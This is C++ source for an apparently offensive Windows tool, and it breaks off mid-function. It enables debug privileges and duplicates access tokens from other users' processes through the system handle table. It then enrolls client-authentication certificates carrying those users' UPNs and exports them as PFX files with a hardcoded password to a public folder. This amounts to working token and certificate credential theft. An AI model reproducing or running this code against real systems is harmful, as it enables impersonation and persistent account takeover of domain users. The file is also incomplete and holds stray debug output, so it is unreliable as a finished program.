#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <lm.h>
#include "ACL.h" 
#include <iostream>
#include <vector>
#include <string>
#include <limits>
#include <memory>
#include <algorithm>
#include <sddl.h>
#include <fstream>   
#include <cstdlib>   
#include <cstdio>    
#include <array>    
#include <set>       
#include <locale>    
#include <codecvt>   
#include <thread>    
#include <chrono>    
#include <Shlwapi.h> 


#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Userenv.lib") 
#pragma comment(lib, "Shlwapi.lib") 

// --- Defines ---
#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 256
#define FULL_NAME_LENGTH (MAX_USERNAME_LENGTH + MAX_DOMAINNAME_LENGTH + 1)
#define TOKEN_TYPE_LENGTH 30
#define TOKEN_IMPERSONATION_LENGTH 50
#define TOKEN_INTEGRITY_LENGTH 20
#define COMMAND_LENGTH 2048
#define SYSTEM_HANDLE_INFORMATION_SIZE (1024 * 1024 * 10)
#define _CRT_SECURE_NO_WARNINGS

// --- File Path Defines ---
const std::string PUBLIC_PATH = "C:\\Users\\Public\\";
const std::string INF_FILENAME_PREFIX = "My_request_";
const std::string CSR_FILENAME_PREFIX = "My_request_";
const std::string CER_FILENAME_PREFIX = "My_Cert_";
const std::string THUMBPRINT_FILENAME = PUBLIC_PATH + "thumbprint.txt";
const std::string PFX_PASSWORD = "1qaz!QAZ";


// --- NTSTATUS Definitions ---
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef STATUS_BUFFER_OVERFLOW
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
#endif
#ifndef STATUS_INVALID_HANDLE
#define STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
#endif
#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif

// --- Windows Structures ---
#define SystemHandleInformation 16

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

// --- Function Pointer Types ---
using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// --- NtQueryObject Declaration ---
extern "C" NTSTATUS NTAPI NtQueryObject(
    HANDLE Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength);

// --- String Conversion Utilities ---

std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_ACP, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_ACP, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}


std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}


// --- Get Domain Name ---
std::string GetUserDnsDomain() {
    std::string result = "";
    std::array<char, 256> buffer;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("set USERDNSDOMAIN", "r"), _pclose);
    if (!pipe) {
        wprintf(L"[!] GetUserDnsDomain: _popen() failed!\n");
        return "";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }


    size_t equalsPos = result.find('=');
    if (equalsPos != std::string::npos) {
        std::string domain = result.substr(equalsPos + 1);

        size_t first = domain.find_first_not_of(" \t\r\n");
        size_t last = domain.find_last_not_of(" \t\r\n");
        if (first != std::string::npos && last != std::string::npos) {
            std::string trimmedDomain = domain.substr(first, (last - first + 1));
            if (!trimmedDomain.empty()) {
                return trimmedDomain;
            }
        }
    }
    return "";
}


//Certificate  Functions

std::string trim(const std::string& str) {
    size_t first = str.find_first_not_of(" \t\r\n");
    size_t last = str.find_last_not_of(" \t\r\n");
    if (first == std::string::npos || last == std::string::npos)
        return "";
    return str.substr(first, (last - first + 1));
}

// Generate INF file content
std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath) {

    if (domain.empty() || username.empty()) {
        wprintf(L"[!] generateINF: Username or Domain is empty. Cannot generate INF.\n");
        return "";
    }

    std::ofstream infFile(infFilePath);
    if (!infFile.is_open()) {
        wprintf(L"[!] generateINF: Failed to open INF file for writing: %S\n", infFilePath.c_str());
        return "";
    }

    std::string domainDC1 = domain.substr(0, domain.find('.'));
    std::string domainDC2 = domain.substr(domain.find('.') + 1);
    std::string subject = "CN=" + username + ", OU=Users, DC=" + domainDC1 + ", DC=" + domainDC2;
    std::string upn = username + "@" + domain;

    infFile <<
        "[Version]\n"
        "Signature=\"$Windows NT$\"\n\n"
        "[NewRequest]\n"
        "Subject = \"" << subject << "\"\n"
        "KeySpec = 1\n"
        "KeyLength = 2048\n"
        "Exportable = TRUE\n"
        "MachineKeySet = FALSE\n"
        "ProviderName = \"Microsoft Enhanced Cryptographic Provider v1.0\"\n"
        "ProviderType = 1\n"
        "RequestType = PKCS10\n"
        "KeyUsage = 0xa0\n\n"
        "[EnhancedKeyUsageExtension]\n"
        "OID=1.3.6.1.5.5.7.3.2\n\n"
        "[Extensions]\n"
        "2.5.29.17 = \"{text}\"\n"
        "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n";

    infFile.close();
    wprintf(L"[*] generateINF: Successfully generated INF file: %S\n", infFilePath.c_str());
    return infFilePath;
}

//  Certificate  Functions Command 

std::wstring getLatestThumbprintCommand() {
    std::string command = "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"try { (Get-ChildItem Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey } | Sort-Object NotBefore -Descending | Select-Object -First 1).Thumbprint | Out-File -Encoding ASCII '" + THUMBPRINT_FILENAME + "' -ErrorAction Stop } catch { Write-Error $_; exit 1 }\"";
    return StringToWString(command);
}

// Reads the thumbprint 
std::string readThumbprintFromFile() {
    std::ifstream file(THUMBPRINT_FILENAME);
    if (!file.is_open()) {
        wprintf(L"[!] readThumbprintFromFile: Failed to open thumbprint file: %S\n", THUMBPRINT_FILENAME.c_str());
        return "";
    }
    std::string thumbprint;
    std::getline(file, thumbprint);
    file.close();

    return trim(thumbprint);
}


// Returns the PowerShell command string to export the PFX
std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username) {
    if (thumbprint.empty() || username.empty()) {
        wprintf(L"[!] exportPFXCommand: Thumbprint or Username is empty.\n");
        return L"";
    }
    std::string pfxFilePath = PUBLIC_PATH + username + ".pfx";

    std::string psCommand =
        "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"try { "
        "$password = ConvertTo-SecureString -String '" + PFX_PASSWORD + "' -AsPlainText -Force; "
        "Export-PfxCertificate -Cert Cert:\\\\CurrentUser\\\\My\\\\" + thumbprint +
        " -FilePath '" + pfxFilePath + "' -Password $password -ErrorAction Stop; "
        "Write-Host 'PFX Exported Successfully' } catch { Write-Error $_; exit 1 }\"";

    return StringToWString(psCommand);
}

// --- Modified TOKEN Struct ---
typedef struct {
    HANDLE TokenHandle;
    int DisplayId;
    DWORD SessionId;
    wchar_t Username[FULL_NAME_LENGTH];
    wchar_t UsernameOnly[MAX_USERNAME_LENGTH];
    wchar_t DomainName[MAX_DOMAINNAME_LENGTH];
    wchar_t TokenType[TOKEN_TYPE_LENGTH];
    wchar_t TokenImpersonationLevel[TOKEN_IMPERSONATION_LENGTH];
    wchar_t TokenIntegrity[TOKEN_INTEGRITY_LENGTH];
    SID_NAME_USE SidType;
} TOKEN;


// --- Global Variables ---
std::vector<TOKEN> g_discoveredTokens;
DWORD g_currentProcessIntegrity = SECURITY_MANDATORY_UNTRUSTED_RID;
DWORD g_currentSessionId = (DWORD)-1;
std::string g_userDnsDomain = "";


// --- Forward Declarations ---
bool EnablePrivilege(LPCWSTR privilegeName);
bool InitializePrivileges();
void RetrieveTokenSessionId(TOKEN& tokenInfo);
void RetrieveTokenUserInfo(TOKEN& tokenInfo); // Modified
void RetrieveTokenDetails(TOKEN& tokenInfo);
std::wstring GetKernelObjectTypeName(HANDLE hObject);
bool DiscoverAndStoreTokens();
void DisplayTokenList();
void CleanupTokenHandles();
bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& commandLine); // Modified
void RequestCertificateForToken(int tokenId); // New
std::string GetUserDnsDomain(); // New
std::string WStringToString(const std::wstring& wstr); // New
std::wstring StringToWString(const std::string& str); // New
std::string trim(const std::string& str); // New
std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath); // New
std::wstring getLatestThumbprintCommand(); // New
std::string readThumbprintFromFile(); // New
std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username); // New
void ClearInputBuffer(); // Added back for interactive input


// --- Function Implementations ---

void ClearInputBuffer() {
    std::wcin.clear();
    std::wcin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
}

bool EnablePrivilege(LPCWSTR privilegeName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        wprintf(L"[!] EnablePrivilege: OpenProcessToken failed. Error: %lu\n", GetLastError());
        return false;
    }

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        wprintf(L"[!] EnablePrivilege: LookupPrivilegeValue failed for %ls. Error: %lu\n", privilegeName, GetLastError());
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        DWORD lastError = GetLastError();
        if (lastError == ERROR_NOT_ALL_ASSIGNED) {
        }
        else {
            wprintf(L"[!] EnablePrivilege: AdjustTokenPrivileges failed for %ls. Error: %lu\n", privilegeName, lastError);
        }
    }

    // Verify if the privilege is actually enabled now
    DWORD dwReturnLength = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwReturnLength);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        wprintf(L"[!] EnablePrivilege: GetTokenInformation (size check) failed for %ls. Error: %lu\n", privilegeName, GetLastError());
        CloseHandle(hToken);
        return false;
    }
    std::vector<BYTE> buffer(dwReturnLength);
    PTOKEN_PRIVILEGES pTokenPrivileges = reinterpret_cast<PTOKEN_PRIVILEGES>(buffer.data());
    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwReturnLength, &dwReturnLength)) {
        wprintf(L"[!] EnablePrivilege: GetTokenInformation failed for %ls. Error: %lu\n", privilegeName, GetLastError());
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
        if (pTokenPrivileges->Privileges[i].Luid.LowPart == luid.LowPart &&
            pTokenPrivileges->Privileges[i].Luid.HighPart == luid.HighPart) {
            if ((pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
                return true;
            }
        }
    }
    return false;
}


bool InitializePrivileges() {
    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    EnablePrivilege(SE_INCREASE_QUOTA_NAME);

    HANDLE hCurrentToken;
    DWORD cbSize = 0;
    g_currentProcessIntegrity = 0;
    g_currentSessionId = (DWORD)-1;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentToken)) {

        GetTokenInformation(hCurrentToken, TokenIntegrityLevel, NULL, 0, &cbSize);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, cbSize);
            if (pTIL && GetTokenInformation(hCurrentToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize)) {
                if (pTIL->Label.Sid && IsValidSid(pTIL->Label.Sid)) {
                    DWORD dwIntegrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
                    PUCHAR RIDS = GetSidSubAuthorityCount(pTIL->Label.Sid);
                    if (RIDS && *RIDS > 0) {
                        dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(*RIDS - 1));
                    }
                    g_currentProcessIntegrity = dwIntegrityLevel;
                }
            }
            if (pTIL) LocalFree(pTIL);
        }

        // Get Session ID
        cbSize = sizeof(DWORD);
        if (!GetTokenInformation(hCurrentToken, TokenSessionId, &g_currentSessionId, cbSize, &cbSize)) {
            g_currentSessionId = (DWORD)-1;
            
        }

        CloseHandle(hCurrentToken);
    }
    else {

    }

    wprintf(L"[*] Current Process Info: SessionID=%lu, Integrity=0x%lX\n",
        (g_currentSessionId == (DWORD)-1) ? 0 : g_currentSessionId,
        g_currentProcessIntegrity);


    bool seDebugOk = EnablePrivilege(SE_DEBUG_NAME);
    bool seAssignPrimaryOk = EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);

    if (!seDebugOk) {
        
    }
    if (!seAssignPrimaryOk) {
        printf("hey");
    }
    return true;
}


void RetrieveTokenSessionId(TOKEN& tokenInfo) {
    DWORD tokenInfoLen = 0;
    DWORD sessionId = (DWORD)-1;
    if (!GetTokenInformation(tokenInfo.TokenHandle, TokenSessionId, &sessionId, sizeof(DWORD), &tokenInfoLen)) {
        tokenInfo.SessionId = (DWORD)-1;
    }
    else {
        tokenInfo.SessionId = sessionId;
    }
}

void RetrieveTokenUserInfo(TOKEN& tokenInfo) {
    DWORD tokenInfoLen = 0;
    PTOKEN_USER tokenUserInfo = NULL;
    wchar_t username[MAX_USERNAME_LENGTH] = { 0 };
    wchar_t domain[MAX_DOMAINNAME_LENGTH] = { 0 };
    wchar_t fullName[FULL_NAME_LENGTH] = L"N/A";
    DWORD userLength = MAX_USERNAME_LENGTH;
    DWORD domainLength = MAX_DOMAINNAME_LENGTH;
    SID_NAME_USE sidUse = SidTypeUnknown;

    wcscpy_s(tokenInfo.UsernameOnly, MAX_USERNAME_LENGTH, L"");
    wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, L"");
    tokenInfo.SidType = SidTypeUnknown;

    GetTokenInformation(tokenInfo.TokenHandle, TokenUser, NULL, 0, &tokenInfoLen);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        tokenUserInfo = (PTOKEN_USER)GlobalAlloc(GPTR, tokenInfoLen);
        if (tokenUserInfo != NULL) {
            if (GetTokenInformation(tokenInfo.TokenHandle, TokenUser, tokenUserInfo, tokenInfoLen, &tokenInfoLen)) {
                if (LookupAccountSidW(NULL, tokenUserInfo->User.Sid, username, &userLength, domain, &domainLength, &sidUse)) {
                    tokenInfo.SidType = sidUse;
                    wcscpy_s(tokenInfo.UsernameOnly, MAX_USERNAME_LENGTH, username);
                    wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, domain);
                    if (domainLength > 0) {
                        swprintf_s(fullName, FULL_NAME_LENGTH, L"%s\\%s", domain, username);
                    }
                    else {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, username);
                    }
                }
                else {
                    tokenInfo.SidType = SidTypeUnknown;
                    LPWSTR sidString = nullptr;
                    if (ConvertSidToStringSidW(tokenUserInfo->User.Sid, &sidString)) {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, sidString);
                        LocalFree(sidString);
                    }
                    else {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, L"Unknown/Lookup Failed");
                    }
                }
            }
            else {
                wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Info");
            }
            GlobalFree(tokenUserInfo);
        }
        else {
            wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Allocating Memory for TokenUser");
        }
    }
    else {
        wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Size");
    }
    wcscpy_s(tokenInfo.Username, FULL_NAME_LENGTH, fullName);
}


void RetrieveTokenDetails(TOKEN& tokenInfo) {
    DWORD returnedLength = 0;
    PTOKEN_STATISTICS tokenStats = NULL;
    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Unknown");
    wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"N/A");
    wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"N/A");

    GetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, NULL, 0, &returnedLength);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        tokenStats = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returnedLength);
        if (tokenStats != NULL) {
            if (GetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, tokenStats, returnedLength, &returnedLength)) {
                if (tokenStats->TokenType == TokenPrimary) {
                    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Primary");
                    wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"-");
                }
                else if (tokenStats->TokenType == TokenImpersonation) {
                    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Impersonation");
                    SECURITY_IMPERSONATION_LEVEL impLevel = tokenStats->ImpersonationLevel;
                    switch (impLevel) {
                    case SecurityAnonymous: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Anonymous"); break;
                    case SecurityIdentification: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Identification"); break;
                    case SecurityImpersonation: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Impersonation"); break;
                    case SecurityDelegation: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Delegation"); break;
                    default: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Unknown"); break;
                    }
                    wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"-");
                }

                if (tokenStats->TokenType == TokenPrimary) {
                    DWORD integrityInfoLen = 0;
                    PTOKEN_MANDATORY_LABEL tokenIntegrityLabel = NULL;
                    GetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, NULL, 0, &integrityInfoLen);
                    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                        tokenIntegrityLabel = (PTOKEN_MANDATORY_LABEL)GlobalAlloc(GPTR, integrityInfoLen);
                        if (tokenIntegrityLabel != NULL) {
                            if (GetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, tokenIntegrityLabel, integrityInfoLen, &integrityInfoLen)) {
                                if (tokenIntegrityLabel->Label.Sid != NULL && IsValidSid(tokenIntegrityLabel->Label.Sid)) {
                                    DWORD dwIntegrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
                                    PUCHAR RIDS = GetSidSubAuthorityCount(tokenIntegrityLabel->Label.Sid);
                                    if (RIDS && *RIDS > 0) {
                                        dwIntegrityLevel = *GetSidSubAuthority(tokenIntegrityLabel->Label.Sid, (DWORD)(*RIDS - 1));
                                    }
                                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Untrusted");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_PLUS_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium+");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_PROTECTED_PROCESS_RID) wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Protected");
                                    else swprintf_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"0x%lX", dwIntegrityLevel);
                                }
                                else { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Invalid SID"); }
                            }
                            else { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetInfo Failed"); }
                            GlobalFree(tokenIntegrityLabel);
                        }
                        else { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Alloc Failed"); }
                    }
                    else { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetSize Failed"); }
                }

            }
            else {
                wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Stats Failed");
            }
            GlobalFree(tokenStats);
        }
        else {
            wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Alloc Failed");
        }
    }
    else {
        wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"GetSize Failed");
    }
}


std::wstring GetKernelObjectTypeName(HANDLE hObject) {
    std::wstring typeName = L"";
    ULONG dwSize = 0;
    NTSTATUS ntReturn;
    std::vector<BYTE> buffer(sizeof(OBJECT_TYPE_INFORMATION) + 512);

    ntReturn = NtQueryObject(hObject, ObjectTypeInformation, buffer.data(), (ULONG)buffer.size(), &dwSize);

    if (ntReturn == STATUS_INFO_LENGTH_MISMATCH || ntReturn == STATUS_BUFFER_OVERFLOW) {
        buffer.resize(dwSize);
        ntReturn = NtQueryObject(hObject, ObjectTypeInformation, buffer.data(), dwSize, &dwSize);
    }
    else if (ntReturn == STATUS_ACCESS_DENIED) {
        return L"Access Denied";
    }
    else if (ntReturn == STATUS_INVALID_HANDLE) {
        return L"Invalid Handle";
    }


    if (NT_SUCCESS(ntReturn)) {
        POBJECT_TYPE_INFORMATION pObjectTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(buffer.data());
        if (pObjectTypeInfo->Name.Buffer != NULL && pObjectTypeInfo->Name.Length > 0) {
            typeName = std::wstring(pObjectTypeInfo->Name.Buffer, pObjectTypeInfo->Name.Length / sizeof(WCHAR));
        }
        else {
            typeName = L"Unknown Type";
        }
    }
    else {
        typeName = L"Query Failed";
    }
    return typeName;
}


bool DiscoverAndStoreTokens() {
    ULONG returnLength = 0;
    NTSTATUS status;
    std::vector<BYTE> handleInfoBuffer(SYSTEM_HANDLE_INFORMATION_SIZE);
    PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = NULL;

    fNtQuerySystemInformation pNtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation) {
        return false;
    }

    status = pNtQuerySystemInformation(SystemHandleInformation, handleInfoBuffer.data(), (ULONG)handleInfoBuffer.size(), &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_OVERFLOW) {
        try {
            handleInfoBuffer.resize(returnLength);
            status = pNtQuerySystemInformation(SystemHandleInformation, handleInfoBuffer.data(), returnLength, &returnLength);
        }
        catch (const std::bad_alloc& e) {
          
            return false;
        }
        catch (...) {
         
            return false;
        }
    }

    if (!NT_SUCCESS(status)) {
    
        return false;
    }

    pHandleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(handleInfoBuffer.data());
    int currentDisplayId = 1;
    g_discoveredTokens.clear();

    for (ULONG i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];

        if (handleInfo.ProcessId == 0) continue;
        if (handleInfo.ProcessId == GetCurrentProcessId()) continue;

        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, handleInfo.ProcessId);
        if (hProcess == NULL) {
            continue;
        }

        DWORD desiredAccess = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        HANDLE hDupToken = NULL;

        if (!DuplicateHandle(hProcess, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &hDupToken, desiredAccess, FALSE, 0)) {
            DWORD lastError = GetLastError();
            if (lastError != ERROR_ACCESS_DENIED && lastError != ERROR_INVALID_HANDLE) {
            }
            CloseHandle(hProcess);
            continue;
        }

        std::wstring objectTypeName = GetKernelObjectTypeName(hDupToken);
        if (objectTypeName == L"Token") {
            TOKEN currentTokenInfo = { 0 };
            currentTokenInfo.TokenHandle = hDupToken;
            RetrieveTokenUserInfo(currentTokenInfo);
            RetrieveTokenSessionId(currentTokenInfo);
            RetrieveTokenDetails(currentTokenInfo);

            if (currentTokenInfo.SidType == SidTypeUser &&
                currentTokenInfo.SessionId != (DWORD)-1 &&
                wcslen(currentTokenInfo.UsernameOnly) > 0)
            {
                bool foundDuplicate = false;
                for (const auto& existingToken : g_discoveredTokens) {
                    if (wcscmp(existingToken.UsernameOnly, currentTokenInfo.UsernameOnly) == 0 &&
                        existingToken.SessionId == currentTokenInfo.SessionId &&
                        wcscmp(existingToken.TokenType, currentTokenInfo.TokenType) == 0 &&
                        wcscmp(existingToken.TokenImpersonationLevel, currentTokenInfo.TokenImpersonationLevel) == 0 &&
                        wcscmp(existingToken.TokenIntegrity, currentTokenInfo.TokenIntegrity) == 0)
                    {
                        foundDuplicate = true;
                        break;
                    }
                }

                if (!foundDuplicate) {
                    currentTokenInfo.DisplayId = currentDisplayId++;
                    g_discoveredTokens.push_back(currentTokenInfo);
                    hDupToken = NULL;
                }
            }
        }

        if (hDupToken != NULL) CloseHandle(hDupToken);
        CloseHandle(hProcess);
    }

   
    return true;
}


void DisplayTokenList() {
    if (g_discoveredTokens.empty()) {
      
        return;
    }
    std::sort(g_discoveredTokens.begin(), g_discoveredTokens.end(),
        [](const TOKEN& a, const TOKEN& b) {
            int userCmp = wcscmp(a.UsernameOnly, b.UsernameOnly);
            if (userCmp != 0) {
                return userCmp < 0;
            }
            return a.SessionId < b.SessionId;
        });

    wchar_t lastUsername[MAX_USERNAME_LENGTH] = L"";
    DWORD lastSessionId = (DWORD)-2;

    for (const auto& token : g_discoveredTokens) {
        if (wcscmp(token.UsernameOnly, lastUsername) != 0 || token.SessionId != lastSessionId) {
            wprintf(L"\n--- User: %ls (Session: %lu) ---\n",
                token.Username,
                (token.SessionId == (DWORD)-1) ? 0 : token.SessionId);
            wcscpy_s(lastUsername, MAX_USERNAME_LENGTH, token.UsernameOnly);
            lastSessionId = token.SessionId;
        }

        const wchar_t* detailLevel = L"-";
        if (wcscmp(token.TokenType, L"Primary") == 0) {
            if (wcscmp(token.TokenIntegrity, L"N/A") != 0)
                detailLevel = token.TokenIntegrity;
        }
